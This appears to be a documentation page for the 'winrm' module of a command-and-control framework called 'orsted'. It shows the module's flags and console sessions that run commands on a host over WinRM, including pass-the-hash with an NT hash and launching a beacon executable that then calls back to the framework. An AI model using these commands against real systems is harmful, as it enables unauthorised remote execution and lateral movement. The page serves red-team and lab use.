---

title: winrm
descripton: orsted c2 winrm
---

### General

`winrm` allows you to winrm. It does not use Winapi, rather it construct SOAP request according to the MS-PSR protocol.

```
[Session 4: haroun@DESKTOP-DU89UIV] » winrm --help

winrm on a remote host

Usage:
  winrm [flags]

Flags:
      --background           Don't catch output, just run in background
  -c, --command    string    The command to run (default: whoami)
  -H, --hash       string    NT to be used in pass the hash
  -h, --help                 display help
  -i, --host       string    The remote host (default: localhost)
      --insecure             Insecure connection
  -p, --password   string    The password to run winrm as
  -P, --port       string    The remote winrm port (default: 5985)
      --tls                  Use HTTPS
  -u, --username   string    The username to run winrm as ex. rudeus, Corp\\Rudeus, rudeus@corp (default: rudeus)
```


It supports pass the hash and also contains a `--background` option to avoid waiting for command output (usefull when running an orsted beacon over winrm).


For example

```
[Session 2: haroun@DESKTOP-DU89UIV] » winrm --host 127.0.0.1 -P 5985 --username administrator --password administrator --command  whoami
+--------+-----------+---------+--------------------------------+
| TASKID | SESSIONID |  STATE  |            COMMAND             |
+--------+-----------+---------+--------------------------------+
|      5 |         2 | pending | winrm 127.0.0.1 5985           |
|        |           |         | not-ionsecure not-tls ntlm     |
|        |           |         | not-background                 |
+--------+-----------+---------+--------------------------------+
[Session 2: haroun@DESKTOP-DU89UIV] »
 >>> winrm --host 127.0.0.1 --port 5985 --username administrator --password administrator --hash  --command "whoami"
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> winrm --host 127.0.0.1 --port 5985 --username administrator --password administrator --hash  --command "whoami"
 <<< desktop-du89uiv\administrator
```

Another example

```
[Session 4: haroun@DESKTOP-DU89UIV] » winrm --host 127.0.0.1 -P 5985 --username administrator --hash  A4141712F19E9DD5ADF16919BB38A95C --background  --command Z:\\main_http.exe
+--------+-----------+---------+--------------------------------+
| TASKID | SESSIONID |  STATE  |            COMMAND             |
+--------+-----------+---------+--------------------------------+
|      9 |         4 | pending | winrm 127.0.0.1 5985           |
|        |           |         | not-ionsecure not-tls ntlm     |
|        |           |         | background                     |
+--------+-----------+---------+--------------------------------+
[Session 4: haroun@DESKTOP-DU89UIV] »
 >>> winrm --host 127.0.0.1 --port 5985 --username administrator --password  --hash A4141712F19E9DD5ADF16919BB38A95C --command "Z:\main_http.exe"
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> winrm --host 127.0.0.1 --port 5985 --username administrator --password  --hash A4141712F19E9DD5ADF16919BB38A95C --command "Z:\main_http.exe"
 <<< Run command in background. No output will be printed

Beacon From 192.168.122.76 - DESKTOP-DU89UIV - DESKTOP-DU89UIV\Administrator - windows
```
